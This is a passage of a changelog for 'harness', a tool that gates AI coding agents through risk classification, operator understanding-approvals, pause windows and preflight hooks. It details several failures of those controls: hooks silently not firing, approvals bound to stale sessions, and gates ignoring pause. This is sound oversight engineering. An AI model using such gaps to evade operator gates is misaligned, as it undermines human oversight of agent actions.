- **Phase 7 #3: Static risk classification** (agent-tasks/ce784625). Second runtime sub-task of the Risk Gate. Adds the Risk Classifier, the first stage to read the `risk:` schema vocabulary shipped in Phase 7 #1. A pure `classifyRisk(envelope, classifiers)` in `src/runtime/risk-classifier.ts` regex-matches the manifest's `risk.classifiers[]` against an Action Envelope and returns a `RiskProfile` (`{ classified, severity, categories, reversible, confidence, reasons }`). Multiple matched patterns compose: highest severity wins, categories union, one `reasons` line per hit. `reversible` is derived from categories, `false` when any of `irreversible_action` / `data_loss` / `destructive` is present. Per the "unknown is not safe" principle, an action no pattern matches yields an honest unclassified profile (`classified: false`, `severity: null`), deliberately not a low/zero-risk one, so the Phase 7 #5 evaluator can gate on it. New debug verb `harness test-risk <event.json>` builds the envelope, classifies it against the manifest (`--config`), and prints the profile (YAML, or `--json`). The tool-event file front end (read, JSON guards, envelope build) is factored into a shared `src/cli/event-input.ts` used by both `explain-action` and `test-risk`. No existing behaviour changes: `harness policy intercept` is not rewired to classify, that is Phase 7 #5. Covered by `tests/runtime/risk-classifier.test.ts` and `tests/cli/test-risk.test.ts`.
- **Phase 7 #2: Action Envelope MVP** (agent-tasks/c1709e04). First runtime sub-task of the Risk Gate. Introduces the Action Envelope as a first-class data structure: a `buildActionEnvelope` function in `src/runtime/action-envelope.ts` normalizes a raw `ToolEvent` (the Claude Code PreToolUse hook payload) into a stable `{ event, tool, raw_input, session{id,repo,branch,task_id}, runtime{cwd,user,host}, timestamp }` shape, so the downstream Risk Gate stages (Risk Classifier #3, Context Resolver #4, Policy Evaluator #5) consume one fixed shape instead of re-parsing a runtime payload. The builder is pure: cwd, git context, user, host, and timestamp arrive via an injected `EnvelopeContext`, the same resolved-by-the-wrapper pattern `intercept()` uses. A sparse or malformed event never throws, absent fields become `""` (or `null` for `raw_input`). New debug verb `harness explain-action <event.json>` reads a tool-event JSON file and prints the envelope (YAML, or `--json`); a missing, malformed, or non-object file exits `EX_NOINPUT`. No existing behaviour changes: `harness policy intercept` is not rewired to build or use the envelope, that is Phase 7 #5. Covered by `tests/runtime/action-envelope.test.ts` and `tests/cli/explain-action.test.ts`.
- **Phase 7 #1 anchor: Risk Gate manifest vocabulary** (agent-tasks/9f7ce9e4). The anchor sub-task for Phase 7 lands the schema vocabulary for the Risk Gate, additive on `version: 1`, with no runtime behaviour. Three new manifest surfaces parse and validate: `risk:` (`classifiers[]`, each binding a tool to regex `patterns[]` that map to a closed `categories` enum and an ordered `severity` scale), `environments:` (`resolvers[]`, each asserting one environment from branch / env-var / kube-context / kube-namespace signals), and an optional `policy.when:` block (`risk.severity_at_least`, `risk.category_in`, `environment.name`, `action.reversible`). Validation covers duplicate-name rejection, `.strict()` entry shapes, regex validation of classifier patterns, closed category / severity / environment enums, an at-least-one-signal rule on resolvers, and an at-least-one-clause rule on `when:`. Nothing reads these keys yet: `harness policy intercept` still matches on `trigger:` alone, and a `when:` block is parsed but inert. The Risk Classifier (#3), Context Resolver (#4), `when:` evaluator and `require_approval` decision (#5), and `PreToolUse` enforcement (#6) wire the runtime in later sub-tasks. The architectural split is settled and documented: the Risk Gate lives entirely inside harness layered onto the Phase 4 `policy intercept` runtime, `agent-grounding` stays the evidence backend and gains no risk-gate code. New canonical reference `docs/risk-gate.md` (target architecture, manifest reference, decision model, resolved open questions); `docs/ROADMAP.md` Phase 7 gains the six-sub-task decomposition. `docs/examples/full-manifest.yaml` carries a worked `dangerous-shell` classifier and `production-signals` resolver, covered by the byte-for-byte `describe` golden. Five invalid fixtures (`19`-`23`) and a dedicated schema test block cover the new validation paths. A manifest written for `0.25.2` parses byte-identically: both keys default to empty.

### Changed

- **Internal: the `pause-check` helper moved from `src/cli/pack/` to the `src/cli/` root** (agent-tasks/ef516cda). `checkPauseFromLoader` was authored as a pack-hook helper and lived under `cli/pack/`. The `harness policy intercept` pause-sentinel fix in this release made `cli/policy/intercept.ts` a consumer too, so the helper became genuinely cross-layer and the old location forced `intercept.ts` to reach sideways into the pack layer for a sibling concern. The file now sits at `src/cli/pause-check.ts`; all six consumers (the five pack hooks plus `policy/intercept.ts`) import `../pause-check.js`. Pure relocation, no behaviour change.

### Fixed

- **`harness policy intercept` now honours the pause sentinel** (agent-tasks/1cec399e). The preflight / repository gate and every other policy-layer hook routed through `harness policy intercept` kept firing while harness was paused, blocking Bash commands inside an active, unexpired pause window. `harness pause` is documented (`docs/for-humans.md`) as making every PreToolUse / PostToolUse hook dormant, and the pack hooks (`understanding-before-execution`, `branch-protection`) already honoured it via `checkPauseFromLoader()`. `runInterceptCli` in `src/cli/policy/intercept.ts` did not: it went straight from stdin parse to `loadManifest()` to policy evaluation with no pause check. This was especially wrong because the documented primary use of pause is lockout recovery, the exact scenario where a wedged preflight or grounding gate is what the operator is trying to escape. `runInterceptCli` now calls `checkPauseFromLoader()` immediately after parsing the event JSON and BEFORE manifest load (so the bypass holds even when the manifest itself is the broken thing), mirroring `hook-pre-tool-use.ts`. While paused it emits the standard `harness policy intercept: PAUSED ...` stderr notice and allows without evaluating; an expired sentinel auto-resumes and evaluation continues normally. `InterceptCliOptions` gains a test-injection `generatedDir`. Covered by a new `pause -> policy intercept hook -> resume` pair-test (plus an auto-expiry case) in `tests/cli/pause-hook-integration.test.ts`.

## [0.25.2] - 2026-05-20

**Headline: three patch fixes from post-v0.25.1 dogfooding.** `harness init --interactive` wire-now no longer misreports an idempotent `settings.json` merge as a failure, so an operator re-running the installer against an already-wired runtime is no longer sent looping through redundant `harness apply` commands. A wall-clock-flaky `pause-hook-integration` test that intermittently dropped `harness preflight` confidence and blocked release pushes is deflaked. And the `~/.claude/` legacy-fallback deprecation warning no longer claims the fallback was removed in v0.25.0, a version that shipped with it intact. **Operator action**: none; re-run `npm i -g @lannguyensi/harness` to upgrade.

### Fixed

- **`pause-hook-integration` auto-expiry test is deterministic, no longer wall-clock flaky** (agent-tasks/8fc70e57, friction #17). The `tests/cli/pause-hook-integration.test.ts` "auto-expires past the `--for` window" test paused harness with a 1s `--for` window, then bridged the gap to the hook fire with a real `setTimeout` (~1100ms) before asserting the sentinel had expired. `pause()` writes `expiresAt` off the wall clock and the PreToolUse hook checks expiry against the wall clock, but `setTimeout` counts monotonic time; on a host whose wall clock drifts relative to the monotonic timer (WSL2, a loaded CI runner) the ~100ms margin could read the sentinel as still active, short-circuit the hook to allow, and flake `res.blocked`. Observed twice on 2026-05-20, once dropping `harness preflight` confidence to 0.59 and blocking a release-branch push. `PackHookPreToolUseOptions` gains an optional `now` (test injection) threaded into the pause-check `now` seam that `checkPauseFromLoader` / `maybeAnnouncePause` / `readSentinel` already accept; the test now pauses and fires the hook off a single injected clock with no real sleep. No runtime behaviour change: `now` defaults to `new Date()` exactly as before.
- **`harness init --interactive` wire-now no longer misreports an idempotent `settings.json` merge as a failure** (agent-tasks/700636f4). When the wire-now step's `--target --merge` produced content byte-identical to the existing `settings.json` (an idempotent re-apply where the runtime was already wired), `apply()` correctly wrote nothing and returned `targetWritten: false`. Two consumers read `!targetWritten` as "not wired": the interactive wizard's `wireRuntime()` printed "Wire-now did not write ... Retry manually", and the `harness apply` Next-steps hint printed "Nothing is wired into Claude Code yet" and recommended another apply, looping the operator through redundant apply commands against an already-correct file. The root cause is that `targetWritten` is tri-state collapsed into a boolean: false covers both the already-in-sync success case and the `target-exists-refuse` failure case. `ApplyResult` gains an explicit `targetInSync` flag, true when the target holds the merged content after the run (written this run or already byte-identical), false only on `target-exists-refuse`. Both consumers now treat `targetWritten || targetInSync` as wired and report an idempotent merge as "wired into `<path>` (already in sync)". The merge logic in `apply()` is unchanged; only the success/failure classification in the two consumers was wrong. New regression tests cover `apply()` returning `applied` with `targetWritten:false` and `targetInSync:true`, the `harness apply` CLI not printing "Nothing is wired" against an in-sync target, and the wizard reporting a re-run wire-now as wired.
- **`resolveHomeDir` legacy-fallback warning no longer claims a stale removed-in version** (agent-tasks/4fb266a1). The `~/.claude/` legacy-fallback deprecation warning in `src/runtime/home-dir.ts` read "The legacy fallback is removed in v0.25.0", text written back in v0.24.0 anticipating the removal. v0.25.0 shipped with the legacy fallback intentionally intact, so the warning told operators on a legacy install that the fallback was already gone in a version they might be running. The warning now reads "will be removed in a future release" with no hardcoded version, and a regression test asserts it names no specific `removed in vX` version. The same stale v0.25.0 claim is also corrected in `docs/migration/v0.24.0-home-dir.md` and `docs/ROADMAP.md`. No behaviour change.

## [0.25.1] - 2026-05-20

**Headline: `harness init --interactive` works again on migrated installs.** A patch for the one regression in v0.25.0's interactive installer: on an install whose state was migrated to `~/.harness/` (v0.24.0), the wizard probed the legacy `~/.claude/` path, mis-reported the manifest as absent, prompted for the wrong path, and then refused to write, ignoring `--force`. `detect()` now resolves the manifest through `resolveHomeDir()` like the rest of harness, and `--force` is threaded into the wizard. **Operator action**: `npm i -g @lannguyensi/harness` to upgrade; no manifest or config changes.

### Fixed

- **`harness init --interactive` no longer mis-detects the manifest on a v0.24.0-migrated install, and `--force` is honored** (agent-tasks/418cebd4). On an install whose state was migrated to `~/.harness/`, `harness init --interactive` probed `~/.claude/harness.yaml` (the legacy claude-code runtime dir), reported "manifest absent", offered to write to that legacy path, and then `init()` (which resolves the real path via `resolveHomeDir()`) refused on the actual `~/.harness/harness.yaml` with "pass --force to overwrite", even when `--force` had been passed. Two root causes, both v0.24.0 home-dir-migration regressions in the interactive path. (1) `detect()` resolved the manifest path by hardcoding the claude-code runtime dir (`~/.claude/`) instead of calling `resolveHomeDir()`; it now resolves through `resolveHomeDir()` (runtime-neutral `~/.harness/`, falling back to legacy `~/.claude/` only when harness state physically lives there), so the wizard, its environment probe, and `init()` all agree on where the manifest lives. The claude-code and codex runtime detection is unchanged. (2) The init command's `--interactive` branch never passed `--force` into `runInteractive`'s `forceOverwrite`, so the flag was silently dropped; it is now threaded, and `harness init --interactive --force` skips the overwrite prompt as documented. The wizard's `homeDir` bridging to `init()` / `apply()` is also corrected to pass the resolved harness root rather than `$HOME/.claude`. New regression tests cover `detect()` resolving `~/.harness/` versus the legacy `~/.claude/` fallback, and the wizard detecting plus force-overwriting an existing `~/.harness/` manifest.

## [0.25.0] - 2026-05-20

**Headline: batch pre-approval for the understanding gate, plus three gate and CLI fixes.** PR #218 makes `harness approve understanding --task` variadic, so a multi-task session (e.g. a CVE sweep across N repos) is pre-approved in one operator action instead of one round-trip per `task_finish`. Three fixes ride along: `harness pause` is a top-level command again (#220, it had been mis-registered as a subcommand of `migrate-home` and dropped from `harness --help`), the `harness approve understanding` session resolver no longer guesses a stale unrelated session from a finished gate cycle (#221), and the Full init template floors agent-preflight at 0.2.0 so secret-detection no longer hard-fails preflight on a normal gitignored `.env` (#219). **Operator action**: none; re-run `npm i -g @lannguyensi/harness` to upgrade.

### Changed

- **FULL_TEMPLATE `git-preflight` hook floors agent-preflight at 0.2.0** (agent-tasks/feffe938). agent-preflight 0.2.0 makes secret detection git-aware and diff-scoped: a gitignored+untracked `.env` holding real credentials (the normal, correct state), a `.md` doc, a non-git directory, or a secret in a tracked file the current branch never touched is reported as a non-blocking `warn` instead of a hard `fail`. Pre-0.2.0 installs hard-fail preflight on that normal state, so the `git-preflight` SessionStart producer (`harness session-start preflight`) never writes a `preflight:` tag and the `preflight-before-*` policies stay closed forever on any repo with a local `.env`. The `min_version` floor on the FULL_TEMPLATE `git-preflight` hook moves `0.1.1` to `0.2.0` (probed by `harness doctor` via `preflight --version`), and the `PROFILE_DEPENDENCIES.full` preflight entry in the `harness init` wizard gains a matching `minVersion: "0.2.0"` so the dependency table surfaces the floor (it previously carried none, the only Full-profile dep without one). The floor is a doctor-warn / wizard-hint, not a forced install: an operator on a stale 0.1.x build still runs, just with the secret-detection footgun and a doctor warning. The `PreflightJson` consumer in `src/cli/session-start/index.ts` is unaffected: it filters checks by `status === "fail" | "error"`, so reclassified `warn` findings drop out cleanly, and the new agent-preflight `path:line` finding format is not parsed. The `init-full-template-pins.test.ts` drift guard moves with the floor.

### Added

- **`harness approve understanding --task` accepts multiple ids: pre-approve a whole task batch in one operator action** (agent-tasks/0dce3880). The understanding gate is task-scoped: the `expire_on_tool_match` PostToolUse hook expires the approval on every `task_finish`, so a multi-task session (e.g. a CVE sweep across N repos) previously needed one `harness approve understanding` round-trip per task. `--task` is now variadic (`--task a b c`, or comma-joined `--task a,b,c`); each id gets its own task-scoped marker written up front. As the agent's active claim cycles through the listed tasks, each `task_start` finds its marker already present, so the operator approves once for the whole batch. The gate stays genuinely task-scoped: the operator's Understanding Report still has to enumerate every task it covers, only the round-trip count collapses. `ApproveUnderstandingOptions` gains `tasks?: string[]` (the back-compat single `task?: string` still works; `tasks` wins when both are set); the result's `taskMarker` field becomes `taskMarkers: TaskMarkerOutcome[]` (empty when no task resolved, one entry per id otherwise). Entries are comma-split, trimmed, and de-duplicated. The CLI prints one `task: ✓ …` line per id plus a batch summary when more than one was written.

### Fixed

- **`harness pause` is registered as a top-level command again** (agent-tasks/8c4825e9). `harness pause` resolved as "unknown command" and was missing from `harness --help`. In `src/cli/index.ts` the `.command("pause")` call was chained directly onto the `migrate-home` command's `.action()`; because Commander's `.command()` returns the newly created subcommand (and `.description()/.option()/.action()` return `this`), that chain registered `pause` as `harness migrate-home pause` rather than as a sibling of the top-level `resume` command. The fix terminates the `migrate-home` chain and starts `pause` as its own `program.command("pause")` statement; the handler and options are unchanged. `migrate-home` itself was never broken (its action still runs when no subcommand is given). New `tests/cli/pause-command-registration.test.ts` drives `buildProgram()` + `run(["--help"])` to assert `pause` is top-level, is not a `migrate-home` subcommand, and appears in the help banner; the pre-existing `pause.test.ts` exercises the `pause()` function directly and so never covered the CLI wiring.
- **`harness approve understanding` no longer binds a session to a stale, unrelated Understanding Report** (agent-tasks/0dce3880, friction #1). Surfaced 2026-05-20 during a multi-repo CVE sweep: on a fresh session, `harness approve understanding` flipped a two-day-old report from a different investigation to `approved`, because `findLatestReportForSession`'s tolerant fallback adopted any report lacking a `sessionId` field, including one already cycled to `expired` by a prior task. Two complementary fixes: (1) `findLatestReportForSession` gains a `tolerantFallback` option; `harness approve understanding` passes `"uncompleted"`, which makes the sessionId-null fallback skip reports whose `approvalStatus` is a terminal `approved` / `expired` (those belong to a finished cycle and must not be re-adopted) while still accepting a fresh `pending` report. The gate read path (`checkPersistedReport`) and post-tool-use expiry keep the default `"any"` behaviour for back-compat. (2) When `harness approve understanding` flips a report that lacks a `sessionId`, it now stamps the current session id onto the report, so every later lookup strict-matches it and the tolerant fallback can never re-adopt it for a different session. The CLI surfaces this as `; stamped sessionId` on the `report:` line and `persistedReport.sessionIdStamped` in the result. Reports that already carry a `sessionId` are left untouched. The complete fix also wants the standalone `@lannguyensi/understanding-gate` Stop hook to write `sessionId` into reports at capture time; that cross-package change is tracked separately.
- **`harness approve understanding` no longer guesses a stale, unrelated session from a finished gate cycle** (agent-tasks/56f51f2b). When run without `--session`, without `$CLAUDE_SESSION_ID` / `$CODEX_SESSION_ID`, and without a gate-staged `.pending-approval`, the session-id resolver falls through to tier 5: read the id from the freshest persisted Understanding Report. That tier adopted the newest report regardless of its `approvalStatus`, so an `approved` / `expired` report from a different session days ago (e.g. a stale Codex session) could be picked, the approval marker written for that session, and the live session left gated. Tier 5 now only adopts a `pending` report (a fresh gate cycle no approval has consumed yet), mirroring the `tolerantFallback: "uncompleted"` restriction PR #218 applied to the report-flip path. When every report is already `approved` / `expired`, the command fails loudly with the existing no-session-id error instead of silently approving the wrong session. The residual case (a stale session left a never-approved `pending` report) is now caught by a loud CLI warning: when the id comes from tier 5, `harness approve understanding` prints a `⚠ WARNING` block naming the report file it guessed from and telling the operator to confirm the id against the running agent before trusting the marker. `ApproveUnderstandingResult` gains `newestReportPath`, set only for the `newest-report` source. This is distinct from the report-flip fix above (agent-tasks/0dce3880): that one stopped a stale report being *flipped*, this one stops a stale session id being *resolved*.

## [0.24.1] - 2026-05-19

**Headline: post-migration Codex apply fix.** v0.24.0 dogfood found that `harness apply --runtime codex --install` refused on drift after a default claude-code apply had rewritten `.last-apply` without the prior `codex/config.toml` entry. Two helpers close the gap: forward-merge of orphan `.last-apply` entries across runtimes, and banner-prefix recovery of an on-disk harness-generated Codex artifact when the entry is missing. The `CODEX_GENERATED_HEADER_LINE` literal is now exported from `generate-codex-config.ts` (single source of truth) and pinned via a regression test so a future banner re-word can't silently disable recovery. **Operator action**: none. The next `harness apply --runtime codex --install` after upgrading to v0.24.1 auto-recovers; subsequent applies are idempotent no-ops. Operators still on v0.24.0 who hit drift-refuse can either upgrade to v0.24.1 or run `harness apply --runtime codex --install --overwrite-drift` once.

### Fixed

- **`harness apply --runtime codex` no longer refuses on post-migration drift when `.last-apply` was Claude-only** (agent-tasks/f3e09849, PR #216). Surfaced 2026-05-19 right after the v0.24.0 home-dir migration: an operator who ran `harness apply` (default claude-code) after `harness migrate-home` ended up with a `.last-apply` that listed only the claude-code expected files. The prior codex entry for `codex/config.toml` was dropped wholesale because each apply rewrote `.last-apply` from scratch with the current runtime's expected set only. A subsequent `harness apply --runtime codex --install` then hit drift-refuse against the existing harness-generated `codex/config.toml` on disk (which still embedded the legacy `~/.claude/.understanding-gate/reports` paths), because the three-state-compare saw `lastApplied=null + onDiskCurrent=<stale> + manifestExpected=<new>` and treated the stale file as operator hand-edits. Two complementary fixes in `src/cli/apply/apply.ts`: (1) `buildMergedLastApplyRecord` now preserves orphan-from-other-runtime entries from the previous `.last-apply` when writing a new one, so a default claude-code apply no longer drops the codex baseline; (2) `recoverMissingLastApplyContent` accepts an on-disk `codex/config.toml` whose first line matches `CODEX_GENERATED_HEADER_LINE` (the literal banner the Codex generator emits) as a recoverable baseline when `.last-apply` has no entry for it, unsticking operators who upgraded mid-flight without the merged record. The recovery branch is also wired into the no-changes path so a recovered baseline persists for the next apply. The `CODEX_GENERATED_HEADER_LINE` constant is exported from `generate-codex-config.ts` (single source of truth) and pinned via a regression test that asserts the generator's first line matches the recovery branch's expected literal, so a future banner re-word fails the test loud instead of silently disabling recovery. Two new regression tests cover (a) codex apply → claude-code apply → codex apply with no drift-refuse, (b) stale-codex-artefact recovery with full path-regeneration through `--install`.

## [0.24.0] - 2026-05-19

**Headline: Codex parity and runtime-neutral state root.** Four PRs all merged 2026-05-19. PR #211 fixes the Codex hook config schema to match Codex 0.131.0 (PascalCase event keys, nested command-hook arrays, `timeout` in seconds), closing a silent gap where `harness apply --runtime codex` emitted a TOML that current Codex no longer loads. PR #212 follows up with `harness apply --runtime codex --install`, which merges the generated hook block into a marked harness-managed region of `~/.codex/config.toml` so operators no longer copy-paste by hand. PR #213 makes `harness approve understanding` runtime-neutral: the Codex pre-tool-use blocker now stages `.pending-approval` (mirror of the Claude blocker since 33abc147), the session-id resolver gains `$CODEX_SESSION_ID` env and a fifth tier that reads the freshest persisted report's `sessionId` JSON field, and the no-session-id error text drops the Claude-only transcript-grep advice. PR #214 (this release's anchor) moves the harness state root from `~/.claude/` to runtime-neutral `~/.harness/` and adds `harness migrate-home` for one-shot migration; the legacy fallback survives the v0.24.x line and is targeted for deletion in v0.25.0. **Operator action**: run `harness apply --runtime codex --install` if you use Codex; run `harness migrate-home --apply` then `harness apply` to move your state into the new root.

### Changed

- **Harness operator-state moved from `~/.claude/` to runtime-neutral `~/.harness/`** (agent-tasks/e65decef, PR #214). v0.24.0's headline change. The harness's entire state root was historically hardcoded to `~/.claude/` (default manifest, generated artefacts, persisted reports, lockfile), a holdover from when Claude Code was the only first-class runtime. With Codex parity shipping in v0.23.x and v0.24.0, that naming was misleading for Codex-only operators and surface-area-breaking on a clean system with no Claude Code installed. The new resolver `resolveHomeDir()` (`src/runtime/home-dir.ts`) picks the state root from this precedence chain: explicit `--home` flag, `$HARNESS_HOME` env, existing `~/.harness/`, legacy `~/.claude/` (with a one-line stderr deprecation warning per process when harness state is detected there), create-on-first-use `~/.harness/`. A bare `~/.claude/` directory that contains only Claude Code's own `settings.json` does NOT trigger the legacy fallback: only the presence of `harness.yaml` or `harness.generated/` counts as evidence that harness state lives there, so we never accidentally write into Claude Code's runtime config dir. A new command `harness migrate-home` (dry-run by default, `--apply` to commit) atomically moves `harness.yaml` / `harness.generated/` / `.understanding-gate/` / `harness.lock` from the legacy root to the new root and drops a breadcrumb at `~/.claude/MOVED_TO_~_DOT_HARNESS.txt`. Re-running on already-migrated state is a clean no-op. The migration command refuses to overwrite an existing item at the new path. Subdirectory names inside the new root are unchanged from v0.23.x so the move is a plain `mv` per item, no schema or filename rewrites. The deprecation warning fires at most once per process. **Operator action**: run `harness migrate-home --apply` then `harness apply` to regenerate embedded paths (e.g. `UNDERSTANDING_GATE_REPORT_DIR` in `settings.json` hook commands). The legacy fallback is supported through the v0.24.x line; deletion is targeted for v0.25.0. Operator-facing sweeps in this release: `--config <path>` default-text now reads `~/.harness/harness.yaml; legacy fallback ~/.claude/harness.yaml` across all 33 subcommands; init template comments (`MINIMAL_TEMPLATE`, `FULL_TEMPLATE`, `SOLO_TEMPLATE`, `TEAM_TEMPLATE`) now lead with `~/.harness/harness.yaml`. Tests: 9 in `tests/runtime/home-dir.test.ts` cover full precedence + once-per-process warning + bare-`~/.claude/` non-claim, 7 in `tests/cli/migrate-home.test.ts` cover dry-run, apply, byte-for-byte preservation, idempotent re-run, target-conflict refuse, no-op on fresh install, and partial-migration recovery. New operator guide at `docs/migration/v0.24.0-home-dir.md`. The `resolvePaths` isolation guard from PR #199 is preserved symmetrically against both new and legacy paths; tests still need `homeDir` injection or `HARNESS_ALLOW_REAL_GENERATED_DIR=1` to fall back.

### Added

- **`harness approve understanding` resolves Codex sessions cleanly without `--session`** (agent-tasks/f608b4ee, PR #213). Two complementary fixes close the Codex approval-UX gap surfaced during the 2026-05-19 dogfood: (1) the Codex pre-tool-use blocker (`src/cli/pack/hook-codex-pre-tool-use.ts`) now calls `writePendingApproval(generatedDir, sessionId)` on the block path, mirroring the symmetric staging the Claude blocker has carried since task 33abc147, so arg-less `harness approve understanding` after a Codex PreToolUse block resolves via `.pending-approval` the same way it does in a Claude session; (2) session-id resolution in `src/cli/approve/understanding.ts` gains two new tiers: `$CODEX_SESSION_ID` env (peer of `$CLAUDE_SESSION_ID`, symmetric with the Codex hook's own fallback) and a fifth tier that reads the freshest persisted Understanding Report under `<reportsDir>` and pulls its JSON `sessionId` field. That fifth tier covers the post-Understanding-Report-pre-block window an operator hits when the agent has produced a report but no tool call has yet tripped the gate to stage `.pending-approval`: runtime-neutral, no env-var dependency, no log scraping. The no-session-id error text is rewritten: it now names both env vars, points the operator at the freshest report under the actual `<reportsDir>` as the canonical runtime-neutral recovery path, and drops the Claude-only `ls -t ~/.claude/projects/*/[0-9a-f]*.jsonl` advice that misled Codex operators. `sessionSource` discriminates `env-claude` / `env-codex` so the CLI annotation prints exactly which env var won (e.g. `session: <id> (from $CODEX_SESSION_ID)`). 6 new tests cover the $CODEX_SESSION_ID env tier, the Claude-over-Codex env precedence, the tier-5 newest-report fallback (including legacy reports without a sessionId field), tier-4 beating tier-5, and the rewritten error message; 4 new tests in `tests/cli/pack-hook-codex-pre-tool-use.test.ts` cover the staging-on-block / no-staging-on-allow / no-generatedDir / staging-write-throws contract. Note: the deeper `~/.claude/` to `~/.harness/` home-dir migration that prompted this task is tracked as a separate release vehicle (agent-tasks/e65decef, v0.24.0); this PR is the symptom-level fix the operator sees today.
- **`harness apply --runtime codex --install` merges the generated hook block into `~/.codex/config.toml`** (agent-tasks/6167f326, PR #212). Codex applies previously stopped at writing `harness.generated/codex/config.toml`; the operator then had to copy/paste the harness-managed block into their active Codex config by hand. After PR #211 fixed the hook schema, that manual step also became the only way to actually take the fix live, which surfaced as dogfood friction on 2026-05-19. The installer closes that gap: a marked block (`# Harness Codex hook wiring.` source-prefix line + `# BEGIN harness-managed codex hooks` / `# END harness-managed codex hooks` fence) is replaced in-place, every byte outside the fence is preserved verbatim, and a timestamped backup (`<config>.harness-backup-<ISO8601>`) is written before any change. First install (no prior block) appends with a separating blank line, legacy paste-style blocks (`[[hooks.pre_tool_use]]` + `timeout_ms` + `blocking`) and an existing current managed block both upgrade in-place via `findManagedRange()` which keys off the source-prefix, the BEGIN/END fence, or the generated-banner header. Re-running with unchanged content is a true no-op (`changed: false`, no backup written, exit no-changes). `validateCodexManagedConfig()` runs before any write and refuses to install a payload that still carries legacy fields (`match =`, `timeout_ms =`, `blocking =`, lower-snake hook tables) or a current-shaped hook table missing the nested `hooks = [{ type = "command", command, timeout }]` array, so a generator regression cannot silently break the operator's config. `--install` is rejected without `--runtime codex` and a new `--codex-config <path>` overrides the default `~/.codex/config.toml` for non-default installs. The `init --interactive` wizard's codex wire-now path now uses the installer instead of printing copy-paste instructions; the wizard's recovery hint also updates to the new command. 11 tests in `tests/cli/apply/apply-codex-runtime.test.ts` cover install / legacy-upgrade / current-block-update / idempotency / backup / no-install-without-codex-runtime, plus updated `tests/cli/init-interactive.test.ts` assertions for the wizard's new wiring. **Operator action**: re-run `harness apply --runtime codex --install` once to lift the harness-managed block off the manual copy-paste workflow; subsequent applies of the same manifest are no-ops.

### Fixed

- **Codex hook config generation matches the Codex 0.131.0 schema** (agent-tasks/4b2b43a0, PR #211). `harness apply --runtime codex` previously emitted the legacy flat shape (`[[hooks.pre_tool_use]]` with `name`, `match`, `timeout_ms`, `blocking`, `description`) that Codex 0.131.0 no longer loads. After applying that config into `~/.codex/config.toml` and restarting Codex, gates did not fire: a real `exec_command` reached the shell with no `hook/started` / `hook/completed` evidence in `codex-tui.log`. Verified against the current OpenAI/Codex source (`codex-rs/config/src/hook_config.rs`): hook table keys must be PascalCase event names (`[[hooks.PreToolUse]]`, `[[hooks.UserPromptSubmit]]`, `[[hooks.Stop]]`, `[[hooks.SessionStart]]`, `[[hooks.PostToolUse]]`), the matcher field is `matcher` (not `match`), and each group carries a nested `hooks = [{ type = "command", command = "...", timeout = N }]` array with `timeout` in seconds (upstream `timeout_sec` is serde-renamed to `timeout`). Generator now converts `budget_ms` to seconds via `Math.max(1, Math.ceil(budget_ms / 1000))` (rounds up, never tightens an operator's declared budget) and drops the Harness-internal `name` / `blocking` / `description` fields entirely since Codex has no slot for them. `expandCodexHookMatchPattern()` is preserved unchanged, so the `apply_patch|Bash|shell|exec_command|functions.exec_command` matcher still intercepts unified-exec on `Bash`. Banner comments and `docs/policy-packs/understanding-before-execution.md` updated to describe the new shape. Doctor (`src/cli/doctor/codex.ts`) was already shape-agnostic (validates banner + binary on PATH, not field names) and required no change. Schema acceptance confirmed via `codex --strict-config -c 'hooks.PreToolUse=[{matcher="Bash",hooks=[{type="command",command="/bin/true",timeout=5}]}]' doctor --json` on Codex 0.131.0. **Operator action**: re-run `harness apply --runtime codex` to regenerate `harness.generated/codex/config.toml`, then merge the new stanzas into `~/.codex/config.toml` and restart Codex; the prior generated file produced silent hook drops.

## [0.23.2] - 2026-05-18

**Headline: policy-gate hint clarification + smoke flake.** Three PRs all merged today. PR #206 + PR #207 close the silent-fail trap on ledger_add hints in policy `ux.run` and `producers[].example`: the prior form named the required content tag but NOT the `sessionId` parameter, so an operator binding `sessionId` to the tag UUID (the natural assumption since the tag literally contains the task / PR number / branch) saw the same opaque rejection repeated. The two PRs sweep both rendering surfaces plus the operator-facing doc-prose. PR #208 bumps a flaky smoke-test wall-clock assertion (4500ms to 7000ms) that under CI load caused `npm test` to occasionally fail and confused downstream `preflight run .` into a false `npm-test: fail` blocker. **Operator action**: re-run `harness apply` (or `harness init --force`) to regenerate `settings.json` with the updated policy hints.

### Fixed

- **Flaky `smoke.test.ts` SIGKILL escalation upper bound bumped from 4500ms to 7000ms** (agent-tasks/595ba01e, PR #208). The "escalates to SIGKILL when the child traps SIGTERM" test asserted wall-clock elapsed `< 4500ms` (200ms budget + 2000ms grace + epsilon), but under CI load the actual escalation was observed at ~4756ms, causing the test to flake roughly once per ~20 full-suite runs. Downstream impact was particularly bad: when this flake fired during `npm test`, `preflight run .` reported `npm-test: fail` and the pre-push gate blocked. Bumped the bound to 7000ms with an explaining comment naming the observed worst-case + headroom rationale. Regression-detection floor preserved (a real 6s+ cleanup bug still trips the assertion). If the flake reoccurs at the new bound, the follow-up direction is a deterministic refactor (fake timers + stubbed SIGTERM dance) per the task's Option B.
- **Policy `producers[].example` strings + doc-prose snippets now name the `sessionId` parameter** (agent-tasks/76f46488, PR #207). Sweep of the fallback surfaces PR #206 left behind. `producers[].example` feeds the engine-vocabulary deny envelope when an operator strips `ux:` from their manifest, so the same silent-fail trap was reachable one fallback away. Updated 8 `producers[].example` sites in `src/cli/init/templates.ts` plus 8 mirrors each in `docs/examples/full-manifest.yaml` and `full-manifest.expected.yaml`. Two operator-facing doc-prose examples in `docs/for-humans.md` and `docs/writing-custom-policies.md` also updated so the inline ux pattern in the authoring guide matches the rendered output. New pin-test in `tests/cli/init-composer.test.ts` parses FULL_TEMPLATE and asserts every `producers[].example` for `mcp__agent-grounding__ledger_add` includes `sessionId:"${SESSION_ID}"` (asserts >=8 so a dropped site fails the test). Operator action: same as #206, re-run `harness apply` to regenerate `settings.json` with the updated hints.
